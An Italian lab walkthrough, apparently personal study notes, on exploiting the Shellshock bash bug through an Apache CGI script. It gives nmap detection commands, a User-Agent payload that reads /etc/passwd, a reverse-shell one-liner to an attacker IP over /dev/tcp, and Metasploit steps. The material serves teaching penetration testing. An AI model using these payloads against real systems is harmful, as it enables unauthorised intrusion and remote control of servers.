---
description: Linux vulnerability
---

# Vulnerability Analysis: Shellshock (CVE-2014-6271) - Apache e Bash

Questa è una vulnerabilità Linux, che permette RCE, l'exploitation coinvolge due servizi: Apache e Bash.

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Non è più tanto comune come vulnerabilità ma è importante imparare sulla command injection.

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Questi caratteri riguardano una vulnerabilità in bash riguardo environment variable function declaration.

Se questi caratteri sono inseriti in bash ogni comando dopo questi caratteri verrà eseguito in bash.

Gli script CGI sono degli script che consentono di chiamare funzioni sul sistema operativo (es: chiedere il tempo gettime) e poi restituiscono l'output nella pagina web. Sopno utili e usati solitamente in Apache.

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Quindi quando troviamo un CGI script possiamo inserire nella richiesta HTTP la sequenza di caratteri e un comando, ed esso verrà eseguito.&#x20;

Il modo più efficace di solito è inserire i caratteri e il comando nell'HTTP header user agent.

L'exploit manuale può essere fatto facilmente con un proxy, burp proxy.

## Identificare se server è vulnerabile a Shellshock

```
nmap -sV 192.24.241.3
nmap -sV 192.24.241.3 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" //dobbiamo per forza inserre come argomento il percorso per lo script cgi
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Il countdown è fatto con uno script CGI.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Questo script CGI è accessibile e usaot quindi lo useremo come punto di entrata, ammesso sia vulnerabile a shellshock, e ora lo testiamo:

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## Exploit manuale per Shellshock

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Attiviamo il redirect del traffico da mozilla firefox al proxy di Burp Suite con l'add-on presente qui sopra.

Apriamo Burp Suite

Aggiorniamo la pagina con lo script cgi in modo che venga intercettata la richiesta all'interno di Burp Suite, e la modifichiamo.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Sostituiamo User-Agent con i nostri caratteri speciali **() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'**

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Effettivamente possiamo vedere che nella risposta troviamo il contenuto del file passwd, e quindi possiamo identificare i vari utenti come ad esempio nobody.

### Per ottenere una reverse shell

Apriamo una porta con il listener netcat:

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Apriamo poi Burp Suite e cambiamo il comando specificato nell'user agent con: 'bash -i>&/dev/tcp/KALI LINUX IP/PORT 0>&1'

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## Exploit con MSF

```
msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS 192.24.241.3
set TARGETURI /gettime.cgi
exploit
```

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Abbiamo l'auxiliary module (0) che ci dice se il target è vulnerabile a shellshock e l'exploit module (5) per realizzare l'exploit.

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
